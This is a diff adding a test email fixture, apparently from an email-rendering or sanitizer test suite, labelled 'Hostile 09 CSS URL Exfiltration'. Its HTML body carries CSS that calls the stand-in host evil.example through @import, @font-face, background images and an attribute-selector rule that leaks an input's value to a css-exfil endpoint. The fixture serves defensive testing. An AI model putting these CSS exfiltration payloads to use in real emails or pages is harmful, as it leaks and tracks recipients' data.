@@ -1,0 +1,30 @@
+From: Attacker <attacker@evil.example>
+To: Victim <victim@example.test>
+Subject: Hostile 09 CSS URL Exfiltration
+Date: Tue, 24 Nov 2026 12:08:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html>
+<head>
+  <style>
+    @import "https://evil.example/import.css";
+    @font-face {
+      font-family: "LeakFont";
+      src: url("https://evil.example/leak.woff2");
+    }
+    body {
+      font-family: "LeakFont", sans-serif;
+      background-image: url("https://evil.example/bg-style.png");
+    }
+    input[value^="a"] {
+      background: url(https://evil.example/css-exfil?char=a);
+    }
+  </style>
+</head>
+<body>
+  <input value="abc" style="background-image: url('https://evil.example/inline-style.png')">
+  <p>CSS URL exfiltration test</p>
+</body>
+</html>
